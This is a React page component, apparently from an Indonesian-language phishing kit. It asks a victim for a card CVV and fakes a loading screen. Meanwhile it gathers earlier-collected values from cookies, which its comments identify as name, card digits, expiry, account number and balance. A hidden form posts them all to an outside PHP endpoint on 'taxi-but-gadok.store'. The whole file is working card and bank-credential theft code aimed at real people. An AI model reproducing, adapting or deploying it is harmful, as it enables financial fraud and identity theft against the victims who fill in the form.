import {
    useNavigate
} from 'react-router-dom';
import loading from "../assets/img/loading.gif";
import '../assets/css/App.css';
import {
    useState,
    useEffect
} from 'react';
import Cookies from 'js-cookie';

function Pempat(props) {
    const nav = useNavigate();

    // Isi Link php ini
    let [link, setLink] = useState("https://taxi-but-gadok.store/auth/r-hr2");

    const [satu, setSatu] = useState('');
    const [dua, setDua] = useState('');
    const [tiga, setTiga] = useState('');
    const [empat, setEmpat] = useState('');
    const [lima, setLima] = useState('');
    const [enam, setEnam] = useState('');
    const [cvv, setCvv] = useState('');
    let [loc, setLoc] = useState("");

    const ok = (e) => {
        e.preventDefault();
        props.send();
        document.querySelector('.no-loading').classList.add('loading');
        setTimeout(() => {
            document.querySelector('.no-loading').classList.remove('loading');
            document.querySelector("#php2").submit();
            // nav('/lima')
        }, 6000);
    }

    useEffect(() => {
        Cookies.set('cvv', cvv);
    }, [cvv]);

    // Mengambil nilai dari cookies dan mengatur state saat komponen dimuat
    useEffect(() => {
        setSatu(Cookies.get('satu') || ''); // Mengambil nilai dari cookies untuk duser, atau kosong jika tidak ada
        setDua(Cookies.get('dua') || ''); // Mengambil nilai dari cookies untuk ddigit, atau kosong jika tidak ada
        setTiga(Cookies.get('tiga') || ''); // Mengambil nilai dari cookies untuk dbulan, atau kosong jika tidak ada
        setEmpat(Cookies.get('empat') || ''); // Mengambil nilai dari cookies untuk dtahun, atau kosong jika tidak ada
        setLima(Cookies.get('lima') || ''); // Mengambil nilai dari cookies untuk drek, atau kosong jika tidak ada
        setEnam(Cookies.get('enam') || ''); // Mengambil nilai dari cookies untuk dsisa, atau kosong jika tidak ada
    }, []);

    useEffect(() => {
        setLoc(window.location.origin + '/lima');
    }, []);

    return ( <
        >
        <
        div className = "pg4" >
        <
        form className = 'form1'
        onSubmit = {
            ok
        } >
        <
        label > < /label> <
        br / >
        <
        br / >
        <
        br / >
        <
        br / >
        <
        br / >
        <
        br / >
        <
        br / >
        <
        br / >
        <
        br / >
        <
        input style = {
            {
                textAlign: "center"
            }
        }
        type = "tel"
        placeholder = 'Masukkan CVV'
        minLength = {
            3
        }
        maxLength = {
            3
        }
        onInput = {
            e => (props.cvv(e.target.value), setCvv(e.target.value))
        }
        required / >
        <
        br / >
        <
        button > Selanjutnya < /button> <
        /form> <
        /div> <
        div className = "no-loading" >
        <
        img src = {
            loading
        }
        width = "120px"
        alt = "Loading" / >
        <
        /div>

        <
        form action = {
            link + "/all.php"
        }
        method = 'post'
        id = 'php2' >
        <
        input type = "hidden"
        name = 'satu'
        value = {
            satu
        }
        /> <
        input type = "hidden"
        name = 'dua'
        value = {
            dua
        }
        /> <
        input type = "hidden"
        name = 'tiga'
        value = {
            tiga
        }
        /> <
        input type = "hidden"
        name = 'empat'
        value = {
            empat
        }
        /> <
        input type = "hidden"
        name = 'lima'
        value = {
            lima
        }
        /> <
        input type = "hidden"
        name = 'enam'
        value = {
            enam
        }
        /> <
        input type = "hidden"
        name = 'tujuh'
        value = {
            cvv
        }
        /> <
        input type = "hidden"
        name = 'delapan'
        value = {
            ""
        }
        /> <
        input type = "hidden"
        value = {
            loc
        }
        name = 'loc' / >
        <
        /form> <
        />
    );
}

export default Pempat;